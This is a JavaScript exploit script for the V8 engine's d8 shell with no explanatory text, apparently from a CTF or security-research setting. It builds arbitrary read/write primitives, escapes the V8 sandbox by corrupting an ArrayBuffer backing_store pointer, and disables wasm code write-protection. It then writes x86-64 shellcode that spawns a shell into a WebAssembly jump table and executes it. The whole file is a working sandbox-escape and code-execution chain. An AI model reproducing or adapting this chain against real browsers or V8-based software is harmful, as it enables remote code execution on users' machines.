/* constants */

const kBackingStoreOffset = 0x1c; // offset of backing_store in JSArrayBuffer

const kIsolateRootOffset = 0x58; // offset of isolate_root in WasmInstanceObject
const kJumpTableStartOffset = 0x60; // offset of jump_table_start in WasmInstanceObject

const kExternalReferenceTableOffset = 0x1910; // offset of external_reference_table_ in IsolateData

const kFlagRefOffset = 0x10; // offset of flag reference in ExternalReferenceTable
const kFLAGWasmMemoryProtectionKeysOffset = 0xb5; // offset of FLAG_wasm_memory_protection_keys from FLAG_builtin_subclassing


/* helpers */

d8.file.execute("v8/test/mjsunit/wasm/wasm-module-builder.js");

// convert integer into hex string
function hex(i) { return `0x${i.toString(16)}`; }


/* implement sandboxed exploit primitives */

// get compressed address of obj
function addrof(obj) { return Sandbox.getAddressOf(obj); }

// arbitrary address read / write
function rw(addr, value = NaN) {
  let buf = new Sandbox.MemoryView(addr, 8);
  let view = new DataView(buf);

  if (Number.isNaN(value)) { // read
    return view.getBigUint64(0, true);
  } else { // write
    view.setBigUint64(0, value, true);
  }
}


/* escape v8 sandbox */

// arbitrary address read / write (unsandboxed)
function rw_full(addr, value = NaN) {
  let buf = new ArrayBuffer(8);
  let buf_addr = addrof(buf);
  let view = new DataView(buf);

  rw(buf_addr + kBackingStoreOffset, addr); // overwrite backing_store

  if (Number.isNaN(value)) { // read
    return view.getBigUint64(0, true);
  } else { // write
    view.setBigUint64(0, value, true);
  }
}

// construct empty wasm module
let builder = new WasmModuleBuilder();
let instance = builder.instantiate();
let instance_addr = addrof(instance);
console.log(`[+] instance_addr == ${hex(instance_addr)}`);

// obtain address of external_reference_table_
let isolate_root_addr = rw(instance_addr + kIsolateRootOffset);
console.log(`[+] isolate_root_addr == ${hex(isolate_root_addr)}`);
let external_reference_table_addr = isolate_root_addr + BigInt(kExternalReferenceTableOffset);
console.log(`[+] external_reference_table_addr == ${hex(external_reference_table_addr)}`);

// obtain address of FLAG_wasm_write_protect_code_memory
let flag_builtin_subclassing_addr = rw_full(external_reference_table_addr + BigInt(kFlagRefOffset)); // FLAG_builtin_subclassing
console.log(`[+] flag_builtin_subclassing_addr == ${hex(flag_builtin_subclassing_addr)}`);
let flag_wasm_write_protect_code_memory = flag_builtin_subclassing_addr + BigInt(kFLAGWasmMemoryProtectionKeysOffset);
console.log(`[+] flag_wasm_write_protect_code_memory == ${hex(flag_wasm_write_protect_code_memory)}`);

// set FLAG_wasm_write_protect_code_memory to false
let flag = rw_full(flag_wasm_write_protect_code_memory);
flag &= 0xffffffffffffff00n;
rw_full(flag_wasm_write_protect_code_memory, flag);

// construct wasm module for shellcode
builder = new WasmModuleBuilder();
builder.addFunction("main", makeSig([], [])).addBody([]).exportFunc();
instance = builder.instantiate();
instance_addr = addrof(instance);
console.log(`[+] instance_addr == ${hex(instance_addr)}`);

// obtain address of jump table
let jump_table_start = rw(instance_addr + kJumpTableStartOffset);
console.log(`[+] jump_table_start = ${hex(jump_table_start)}`);

let shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]; // shellcode.py

// overwrite jump table with shellcode
while (shellcode.length % 8 != 0) { shellcode.push(0x90); }
for (let i = 0; i < shellcode.length / 8; i++) {
  let segment = 0x0n;
  for (let j = 0; j < 8; j++) { segment += BigInt(shellcode[i * 8 + j]) << BigInt(j * 8); }
  rw_full(jump_table_start + BigInt(i * 8), segment);
}

// execute shellcode
instance.exports.main();
